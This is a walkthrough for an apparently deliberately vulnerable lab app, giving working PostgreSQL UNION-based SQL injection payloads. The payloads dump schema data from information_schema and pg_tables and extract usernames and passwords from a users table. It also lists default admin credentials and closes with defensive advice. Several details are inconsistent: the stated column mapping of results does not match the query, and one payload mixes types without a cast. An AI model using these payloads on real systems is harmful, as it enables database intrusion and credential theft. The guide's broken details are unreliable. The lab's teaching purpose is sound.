# SQL Injection Challenge Guide

This guide demonstrates working SQL injection techniques to extract table schema and DDL from the vulnerable search endpoint.

## Understanding the Vulnerable Query

The search endpoint uses this vulnerable SQL query:
```sql
SELECT id, computer_name, ip_address 
FROM computers 
WHERE computer_name LIKE '%{search_term}%' OR ip_address LIKE '%{search_term}%'
```

**Important**: The query selects **3 columns** (id, computer_name, ip_address), so any UNION SELECT must also return 3 columns.

## Working SQL Injection Payloads

**Important:** The query has `WHERE computer_name LIKE '%{search_term}%' OR ip_address LIKE '%{search_term}%'`, so we need to:
1. Close the LIKE clause with `'`
2. Make the WHERE condition true with `OR '1'='1'`
3. Use UNION to inject our query
4. Comment out the rest with `--`

### 1. Extract Table Names and Columns

**Payload:**
```
' OR '1'='1' UNION SELECT CAST(table_name AS text), CAST(column_name AS text), CAST(data_type AS text) FROM information_schema.columns WHERE table_schema='public' --
```

**What it does:**
- `'` closes the LIKE clause
- `OR '1'='1'` makes the WHERE condition always true
- `UNION SELECT` injects our query
- `CAST(...AS text)` ensures data type compatibility (id is integer, but we cast to text)
- Returns table names, column names, and data types
- `--` comments out the rest of the query

**Expected Result:** 
- Table names appear in "Computer Name" column
- Column names appear in "IP Address" column  
- Data types appear in "ID" column

### 2. Extract Just Table Names

**Payload:**
```
' OR '1'='1' UNION SELECT CAST(tablename AS text), null, null FROM pg_tables WHERE schemaname='public' --
```

**What it does:**
- Uses PostgreSQL's pg_tables system catalog
- Returns only table names (other columns are null)
- Simpler alternative for just getting table names

**Expected Result:** Table names appear in "Computer Name" column

## Step-by-Step Manual Extraction

### Step 1: Find All Tables and Columns

1. Login as admin (username: `admin`, password: `admin123`)
2. Go to the search box
3. Enter: `' OR '1'='1' UNION SELECT CAST(table_name AS text), CAST(column_name AS text), CAST(data_type AS text) FROM information_schema.columns WHERE table_schema='public' --`
4. Click Search
5. Look at the results:
   - **Table names** appear in "Computer Name" column
   - **Column names** appear in "IP Address" column
   - **Data types** appear in "ID" column
6. Filter out the actual computer data (SERVER-01, WORKSTATION-05, etc.)

**Expected Results:**
- users table with columns: id, username, password, role
- computers table with columns: id, computer_name, ip_address

### Step 2: Extract Just Table Names (Alternative)

If you only want table names:
```
' OR '1'='1' UNION SELECT CAST(tablename AS text), null, null FROM pg_tables WHERE schemaname='public' --
```

### Step 3: Reconstruct DDL

Based on the extracted column information, you can reconstruct the CREATE TABLE statements:

**users table:**
```sql
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50) UNIQUE NOT NULL,
    password VARCHAR(100) NOT NULL,
    role VARCHAR(20) NOT NULL DEFAULT 'user'
);
```

**computers table:**
```sql
CREATE TABLE computers (
    id SERIAL PRIMARY KEY,
    computer_name VARCHAR(100) NOT NULL,
    ip_address VARCHAR(15) NOT NULL
);
```

## Using the Demo Script

A Python script is provided to automate the extraction:

```bash
# Make sure the application is running
docker-compose up

# In another terminal, run the demo script
python3 sql_injection_demo.py
```

The script will:
1. Login as admin
2. Extract all table names
3. Extract columns for each table
4. Reconstruct DDL statements
5. Display complete schema information

## Common Issues and Solutions

### Issue: UNION SELECT returns error about mismatched columns
**Solution:** Make sure your UNION SELECT returns exactly 3 columns. Use `null` to fill extra columns.

### Issue: No results returned
**Solution:** 
- Check that you're logged in as admin
- Verify the payload syntax (quotes, spaces, comments)
- Try alternative methods (pg_tables instead of information_schema)

### Issue: Results show actual computer data
**Solution:** The UNION might not be working. Try:
- Adding `OR '1'='1'` before UNION
- Using different comment syntax: `/*` instead of `--`
- Ensuring proper quote escaping

## Advanced Techniques

### Extract Data from Tables

To extract actual data from the users table:
```
' UNION SELECT id, username, password FROM users --
```

**Warning:** This will expose passwords! This is why SQL injection is dangerous.

### Extract More Column Details

To get column constraints, defaults, etc.:
```
' UNION SELECT column_name, column_default, is_nullable FROM information_schema.columns WHERE table_schema='public' AND table_name='users' --
```

## Security Notes

⚠️ **This application is intentionally vulnerable for educational purposes.**

In production applications:
- Always use parameterized queries/prepared statements
- Never concatenate user input directly into SQL queries
- Validate and sanitize all user inputs
- Use an ORM (Object-Relational Mapping) framework
- Implement proper access controls
- Regularly audit code for SQL injection vulnerabilities

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PostgreSQL Information Schema](https://www.postgresql.org/docs/current/information-schema.html)
- [PostgreSQL System Catalogs](https://www.postgresql.org/docs/current/catalogs.html)
